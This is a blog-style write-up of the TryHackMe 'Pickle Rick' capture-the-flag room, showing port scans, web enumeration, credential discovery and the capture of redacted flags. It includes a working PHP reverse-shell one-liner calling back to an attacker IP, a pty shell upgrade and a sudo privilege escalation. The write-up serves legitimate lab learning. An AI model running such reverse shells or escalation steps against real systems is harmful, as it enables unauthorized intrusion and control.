---
layout: post
title:  "TryHackMe Pickle Rick writeup"
date:   2020-09-29 12:59:36 +0200
categories: writeup tryhackme
---

This is a writeup for TryHackMe room [Pickle Rick](https://tryhackme.com/room/picklerick) that requires me to *exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.*

## nmap

We see that there are two open ports: ssh and http.

```bash
$ nmap -A -sC 10.10.68.235
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 08:08 EEST
Nmap scan report for 10.10.68.235
Host is up (0.047s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5f:f1:57:75:ec:04:1c:10:94:0a:fd:77:9d:7f:ce:51 (RSA)
|   256 f8:6c:b7:68:71:d3:d6:7a:2a:11:04:e2:79:3f:12:ae (ECDSA)
|_  256 a2:10:41:7f:30:db:26:9f:0e:0e:e3:d7:51:d1:94:57 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## http enumeration

```bash
$ gobuster -q --wordlist /usr/share/dirb/wordlists/big.txt --url http://10.10.68.235 dir
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

Let's take a look at the server. Page source reveals an username:

```html
 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

robots.txt has an interesting string `__REDACTED__` which could be a password.

```
nikto -host http://10.10.68.235
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.68.235
+ Target Hostname:    10.10.68.235
+ Target Port:        80
+ Start Time:         2020-09-29 09:23:10 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
```

## 1st ingredient

Nikto found a login page. Logging in as R1ckRul3s/__REDACTED__ works. It's a command panel that executes commands. Let's run a reverse shell:

```bash
php -r '$sock=fsockopen("10.8.108.247",4444);exec("/bin/sh -i <&4 >&4 2>&4");'
$ cat Sup3rS3cretPickl3Ingred.txt
__REDACTED__
```

upgrade shell with python: 

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 2nd ingredient

Enumerate the file system from second ingredient:
 	
```bash
$ cd /home/rick
$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
$ cat "second ingredients"
__REDACTED__
```

## 3rd ingredient

Escalate privileges. First thing to try if you know the password is sudo:

```bash
sudo -l
User www-data may run the following commands on
        ip-10-10-163-235.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
sudo less /root/3rd.txt
__REDACTED__
```
